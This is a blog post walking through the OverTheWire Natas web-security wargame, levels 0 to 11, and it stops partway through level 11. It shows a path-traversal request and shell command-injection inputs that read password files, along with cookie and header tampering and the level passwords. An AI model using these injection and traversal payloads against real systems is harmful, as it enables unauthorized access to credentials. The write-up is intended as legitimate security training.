
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>OverTheWire: Natas - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="OverTheWire Natas wargame">
  <meta name="keywords" content="overthewire, wargames, natas, overthewire natas, overthewire natas solutions, overthewire natas walkthrough">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2015/11/30/overthewire-natas">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">OverTheWire: Natas</h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-11-30T04:50:00-05:00" pubdate data-updated="true">Nov 30<span>th</span>, 2015</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Natas teaches the basics of serverside web-security.</p>

<p>Each level of natas consists of its own website located at **<a href="http://natasX.natas.labs.overthewire.org**,">http://natasX.natas.labs.overthewire.org**,</a> where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.</p>

<p>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in <strong>/etc/natas_webpass/</strong>. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.</p>

<p>Start here:</p>

<p>Username: natas0</p>

<p>Password: natas0</p>

<p>URL:      <a href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a></p>

<!-- more -->


<h3>Level 0</h3>

<p><img class="center" src="/images/overthewire/natas/natas0.png" title="natas0" alt="natas 0"></p>

<p>Look in the source for the following comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Level 1</h3>

<p><img class="center" src="/images/overthewire/natas/natas1.png" title="natas1" alt="natas 1"></p>

<p>You can still view the page source from the URL:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:http://natas1.natas.labs.overthewire.org/</span></code></pre></td></tr></table></div></figure>


<p>Again, the password is in a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Level 2</h3>

<p><img class="center" src="/images/overthewire/natas/natas2.png" title="natas2" alt="natas 2"></p>

<p>In the source you will see a directory path that you can navigate to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;files/pixel.png&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Go to <a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a> and you will see a directory listing. Chech the users.txt file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># username:password
</span><span class='line'>alice:BYNdCesZqW
</span><span class='line'>bob:jw2ueICLvT
</span><span class='line'>charlie:G5vCxkVV3m
</span><span class='line'>natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
</span><span class='line'>eve:zo4mJWyNj2
</span><span class='line'>mallory:9urtcpzBmH</span></code></pre></td></tr></table></div></figure>


<h3>Level 3</h3>

<p><img class="center" src="/images/overthewire/natas/natas2.png" title="natas3" alt="natas 3"></p>

<p>There is a comment in the source again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, since they mentioned Google, let&rsquo;s look for a robots.txt file..If you go to <a href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> , you will see the following line: <code>Disallow: /s3cr3t/</code>. Navigate to <a href="http://natas3.natas.labs.overthewire.org/s3cr3t/">http://natas3.natas.labs.overthewire.org/s3cr3t/</a> and there is another users.txt file: <code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code></p>

<h3>Level 4</h3>

<p><img class="center" src="/images/overthewire/natas/natas4.png" title="natas4" alt="natas 4"></p>

<p>If our access is permitted based on the Referer header, all we have to do is change it. I used Live HTTP Headers for the task. Changed the Referer, refreshed the page and: <code>Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code></p>

<h3>Level 5</h3>

<p><img class="center" src="/images/overthewire/natas/natas5.png" title="natas5" alt="natas 5"></p>

<p>So how do they determine if I&rsquo;m logged in? A cookie maybe..I used Firebug to look at cookies, and indeed there is a loggedin cookie with the value of 0. Changed it to 1 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>

<h3>Level 6</h3>

<p><img class="center" src="/images/overthewire/natas/natas6.png" title="natas6" alt="natas 6"></p>

<p>This time we are also given the backend source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">include</span> <span class="s2">&quot;includes/secret.inc&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nv">$secret</span> <span class="o">==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Wrong secret&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>That include directive stands out. If you go to <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a> you get a blank page. But the source is not so blank:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&quot;FOEIUWGHFEEUHOFUOIU&quot;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Enter it in the form and <code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>

<h3>Level 7</h3>

<p><img class="center" src="/images/overthewire/natas/natas7.png" title="natas7" alt="natas 7"></p>

<p>Inside the source there&rsquo;s a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Going to the Home and About pages, nothing interesting jumps out. However, combining the hint with how the URL looks like, I thought about local file inclusion. The normal URL is <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and I tried to read the password file by changing it to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8">http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8</a> . And it worked! The password is <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code></p>

<h3>Level 8</h3>

<p><img class="center" src="/images/overthewire/natas/natas6.png" title="natas8" alt="natas 8"></p>

<p>We have to look at PHP source code again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$encodedSecret</span> <span class="o">=</span> <span class="s2">&quot;3d3d516343746d4d6d6c315669563362&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">encodeSecret</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nx">encodeSecret</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$encodedSecret</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Wrong secret&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s looking for a string that matches the end result of all these conversions. Instead, we can reverse the process and decrypt the encoded secret to its original value.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># hex to binary 
</span><span class='line'>3d3d516343746d4d6d6c315669563362 becomes 00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010 
</span><span class='line'>
</span><span class='line'># binary to ascii
</span><span class='line'>00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010  becomes ==QcCtmMml1ViV3b
</span><span class='line'>
</span><span class='line'># reverse
</span><span class='line'>==QcCtmMml1ViV3b becomes b3ViV1lmMmtCcQ==
</span><span class='line'>
</span><span class='line'># final base64 decode
</span><span class='line'>b3ViV1lmMmtCcQ== becomes oubWYf2kBq</span></code></pre></td></tr></table></div></figure>


<p>Input <code>oubWYf2kBq</code> in the form and you will get <code>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code></p>

<h3>Level 9</h3>

<p><img class="center" src="/images/overthewire/natas/natas9.png" title="natas9" alt="natas 9"></p>

<p>If you enter something, the backend greps for that word in a dictionary file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So I thought to terminate the first command and chain another one, that would read the password: <code>; cat /etc/natas_webpass/natas10</code>. And the password is output, along with the entire file: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code></p>

<h3>Level 10</h3>

<p><img class="center" src="/images/overthewire/natas/natas10.png" title="natas10" alt="natas 10"></p>

<p>This level is the same as the last, except now there is some filtering in place:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This filtering doesn&rsquo;t exclude all characters that could be useful. If you read the <em>grep</em> manpage, you will come across this section:</p>

<blockquote><p>Anchoring
The caret ^ and the dollar sign $ are meta-characters that respectively  match the empty string at the beginning and end of a line.</p></blockquote>

<p>So I went ahead and tried <code>^ cat /etc/natas_webpass/natas11</code>, and the password was output, along with the rest of the file. This worked because <em>grep</em> returned every line containing the string that matches the beginning of the line (or end if you use $). I just added the password file for <em>grep</em> to read</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
</span><span class='line'>dictionary.txt:
</span><span class='line'>dictionary.txt:African
</span><span class='line'>dictionary.txt:Africans
</span><span class='line'>dictionary.txt:Allah
</span><span class='line'>dictionary.txt:Allah's
</span><span class='line'>dictionary.txt:American
</span><span class='line'>dictionary.txt:Americanism
</span><span class='line'>dictionary.txt:Americanism's
</span><span class='line'>dictionary.txt:Americanisms
</span><span class='line'>dictionary.txt:Americans
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Level 11</h3>

<p><img class="center" src="/images/overthewire/natas/natas11.png" title="natas11" alt="natas 11"></p>

<p>The backend code is more complicated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">loadData</span><span class="p">(</span><span class="nv">$def</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">global</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$mydata</span> <span class="o">=</span> <span class="nv">$def</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$tempdata</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">])),</span> <span class="k">true</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;showpassword&quot;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$mydata</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">saveData</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$d</span><span class="p">))));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nx">loadData</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">saveData</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
